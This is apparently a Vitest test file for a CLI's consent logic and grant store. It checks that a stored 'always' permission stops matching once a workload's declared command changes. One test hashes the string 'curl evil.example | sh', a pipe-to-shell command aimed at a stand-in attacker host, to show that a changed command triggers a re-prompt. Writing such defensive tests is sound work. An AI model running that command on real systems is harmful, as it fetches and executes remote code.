import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  commandFingerprint,
  findGrant,
  loadPermissions,
  permissionsPath,
  resolveConsent,
  savePermissions,
  upsertGrant,
  type ConsentInputs,
  type PermissionsFile,
} from "../run/permissions";

// M3D-2 — the CLI consent decision + grant store are PURE (no IO/Docker) so the safety logic is unit-
// testable with plain inputs, exactly like the cloud's run-gate. The end-to-end Docker proof is
// separate; this pins the fingerprint formula + every resolveConsent branch + re-prompt-on-change.

describe("commandFingerprint", () => {
  it("matches the cloud's canonical formula (sha256, first 16 hex)", () => {
    // Pinned parity vector — identical to services/cloud/src/workload.ts:commandFingerprint.
    // sha256("node dist/server.js").slice(0,16). If the cloud formula ever changes, this fails loudly.
    expect(commandFingerprint("node dist/server.js")).toBe("e5854dea1573c269");
  });

  it("is deterministic and changes when the command changes", () => {
    expect(commandFingerprint("npm test")).toBe(commandFingerprint("npm test"));
    expect(commandFingerprint("npm test")).not.toBe(commandFingerprint("npm run test:ci"));
  });
});

// A baseline set of inputs for an interactive, no-grant, require_permission=true run.
function inputs(over: Partial<ConsentInputs> = {}): ConsentInputs {
  return {
    workload: "unit-tests",
    fingerprint: commandFingerprint("npm test"),
    sessionId: "11111111-1111-1111-1111-111111111111",
    perms: { version: 1, grants: [] },
    autoGrant: false,
    requirePermission: true,
    allowInCi: false,
    isTty: true,
    yes: false,
    ...over,
  };
}

describe("resolveConsent", () => {
  it("prompts when interactive with no stored grant", () => {
    expect(resolveConsent(inputs())).toEqual({ kind: "prompt" });
  });

  it("sends an always grant without prompting", () => {
    const fp = commandFingerprint("npm test");
    const perms: PermissionsFile = {
      version: 1,
      grants: [{ workload: "unit-tests", fingerprint: fp, scope: "always" }],
    };
    expect(resolveConsent(inputs({ perms }))).toEqual({
      kind: "send",
      consent: "always",
      ci: false,
    });
  });

  it("honors a session grant only for the matching sessionId", () => {
    const fp = commandFingerprint("npm test");
    const perms: PermissionsFile = {
      version: 1,
      grants: [
        { workload: "unit-tests", fingerprint: fp, scope: "session", sessionId: "session-A" },
      ],
    };
    // Same session → honored.
    expect(resolveConsent(inputs({ perms, sessionId: "session-A" }))).toEqual({
      kind: "send",
      consent: "session",
      ci: false,
    });
    // Different session (e.g. after a re-link) → stale → re-prompt.
    expect(resolveConsent(inputs({ perms, sessionId: "session-B" }))).toEqual({ kind: "prompt" });
  });

  // THE load-bearing property: a stored "always" grant stops matching once the command changes.
  it("re-prompts when the declared command changes (fingerprint mismatch)", () => {
    const oldFp = commandFingerprint("npm test");
    const perms: PermissionsFile = {
      version: 1,
      grants: [{ workload: "unit-tests", fingerprint: oldFp, scope: "always" }],
    };
    // Same command → the grant matches, no prompt.
    expect(resolveConsent(inputs({ perms, fingerprint: oldFp })).kind).toBe("send");
    // Command edited in arcane.toml → new fingerprint → grant no longer matches → re-prompt.
    const newFp = commandFingerprint("curl evil.example | sh");
    expect(newFp).not.toBe(oldFp);
    expect(resolveConsent(inputs({ perms, fingerprint: newFp }))).toEqual({ kind: "prompt" });
  });

  it("sends consent=null when the workload has auto_grant (cloud re-checks)", () => {
    expect(resolveConsent(inputs({ autoGrant: true }))).toEqual({
      kind: "send",
      consent: null,
      ci: false,
    });
  });

  describe("headless / CI (no TTY)", () => {
    it("refuses without allow_in_ci + --yes (never assumes consent)", () => {
      const d = resolveConsent(inputs({ isTty: false }));
      expect(d.kind).toBe("refuse");
    });

    it("refuses with allow_in_ci but no --yes", () => {
      expect(resolveConsent(inputs({ isTty: false, allowInCi: true, yes: false })).kind).toBe(
        "refuse",
      );
    });

    it("sends consent=null, ci=true with allow_in_ci + --yes", () => {
      expect(resolveConsent(inputs({ isTty: false, allowInCi: true, yes: true }))).toEqual({
        kind: "send",
        consent: null,
        ci: true,
      });
    });

    it("auto_grant authorizes a headless run even without allow_in_ci", () => {
      expect(resolveConsent(inputs({ isTty: false, autoGrant: true }))).toEqual({
        kind: "send",
        consent: null,
        ci: true,
      });
    });
  });

  it("refuses locally when require_permission=false and there is no grant/auto_grant", () => {
    const d = resolveConsent(inputs({ requirePermission: false }));
    expect(d.kind).toBe("refuse");
    if (d.kind === "refuse") expect(d.reason).toMatch(/require_permission/);
  });
});

describe("permissions store (.arcane/permissions.json)", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "arcane-perms-"));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("round-trips grants and looks them up", () => {
    const fp = commandFingerprint("npm test");
    upsertGrant(dir, { workload: "unit-tests", fingerprint: fp, scope: "always" });
    const perms = loadPermissions(dir);
    expect(perms.grants).toHaveLength(1);
    expect(findGrant(perms, "unit-tests", fp, "any-session")).toBeDefined();
  });

  it("replaces the grant on the same (workload + fingerprint) key", () => {
    const fp = commandFingerprint("npm test");
    upsertGrant(dir, { workload: "w", fingerprint: fp, scope: "session", sessionId: "s1" });
    upsertGrant(dir, { workload: "w", fingerprint: fp, scope: "always" });
    const perms = loadPermissions(dir);
    expect(perms.grants).toHaveLength(1);
    expect(perms.grants[0]?.scope).toBe("always");
  });

  it("treats a missing file as no grants", () => {
    expect(loadPermissions(dir)).toEqual({ version: 1, grants: [] });
  });

  it("treats a corrupt file as no grants (fail closed → re-prompt)", () => {
    savePermissions(dir, { version: 1, grants: [] }); // creates the .arcane dir
    writeFileSync(permissionsPath(dir), "{ not json");
    expect(loadPermissions(dir)).toEqual({ version: 1, grants: [] });
  });

  it("drops malformed grant rows", () => {
    savePermissions(dir, { version: 1, grants: [] });
    // A session grant missing sessionId is malformed → dropped.
    writeFileSync(
      permissionsPath(dir),
      JSON.stringify({
        version: 1,
        grants: [
          { workload: "w", fingerprint: "abc", scope: "session" },
          { workload: "ok", fingerprint: "def", scope: "always" },
        ],
      }),
    );
    const perms = loadPermissions(dir);
    expect(perms.grants).toHaveLength(1);
    expect(perms.grants[0]?.workload).toBe("ok");
  });

  it("persists session grants with the sessionId and only matches that session", () => {
    const fp = commandFingerprint("npm test");
    upsertGrant(dir, { workload: "w", fingerprint: fp, scope: "session", sessionId: "s1" });
    const perms = loadPermissions(dir);
    expect(findGrant(perms, "w", fp, "s1")).toBeDefined();
    expect(findGrant(perms, "w", fp, "s2")).toBeUndefined();
    // Sanity: the file on disk actually carries the sessionId.
    const raw = JSON.parse(readFileSync(permissionsPath(dir), "utf8"));
    expect(raw.grants[0].sessionId).toBe("s1");
  });
});
